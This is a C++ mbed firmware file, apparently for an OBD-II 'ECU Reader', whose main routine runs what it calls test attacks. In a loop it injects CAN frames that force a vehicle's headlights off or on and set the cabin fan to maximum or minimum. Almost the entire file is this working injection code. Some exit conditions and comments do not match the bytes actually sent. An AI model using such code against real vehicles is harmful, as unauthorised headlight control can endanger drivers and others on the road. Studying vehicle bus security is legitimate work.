#include "mbed.h"
#include "ecu_reader.h"
#include "globals.h"
#include "TextLCD.h"

int main() {
    pc.baud(115200);
    
    //Enable Pullup 
    click.mode(PullUp);
    right.mode(PullUp);
    down.mode(PullUp);
    left.mode(PullUp);
    up.mode(PullUp);
    
    printf("ECU Reader \n"); 
    lcd.locate(0,0);                // Set LCD cursor position

    attacks();
}

void attacks(void){
	lcd.printf("Test attacks to run\n");
	pc.printf("\n up/down for headlights, left/right for fan");
	wait(1);
	while(1)
		{
			
			lcd.locate(0,0);
			if(down == 0){
				//Force headlights off
				while(1){
					//char* message = (char*)"80 00 00 00 00 00 00 00";
					char message[8] = {0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
					if(obdii.send(0x3BB, message))
						lcd.printf("Force headlights off");
					else{
						lcd.printf("Can't send message FHOf");
						break;
					}
					wait(0.1);
					if(down == 0)
						break;
				}
			}
			if(right == 0){
				//Set fan to max
				while(1){
					//char* message = (char*)"00 00 00 1C 00 00 00 00";
					char message[8] = {0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x00};
					if(obdii.send(0x356, message))
						lcd.printf("Fan to max");
					else{
						lcd.printf("Can't send message fan max");
						break;
					}
					wait(0.1);
					if(right == 0)
						break;
					}
				}
			if(left == 0){
				//Set fan to min
				while(1){
					//char* message = (char*)"00 00 00 04 00 00 00 00";
					char message[8] = {0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00};
					if(obdii.send(0x356, message))
						lcd.printf("Fan to min");
					else{
						lcd.printf("Can't send message fan min");
						break;
					}
					wait(0.1);
					if(right == 0)
						break;
					}
				}				
			if(up == 0){
				//Force headlights on
				while(1){
					//char* message = (char*)"20 00 00 00 00 00 00 00";
					char message[8] = {0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
					if(obdii.send(0x3BB, message))
						lcd.printf("Force headlights on");
					else{
						lcd.printf("Can't send message FHO");
						break;
					}
					wait(0.1);
					if(right == 0)
						break;
					}
				}
			if(click == 0)
				break;
			}
}
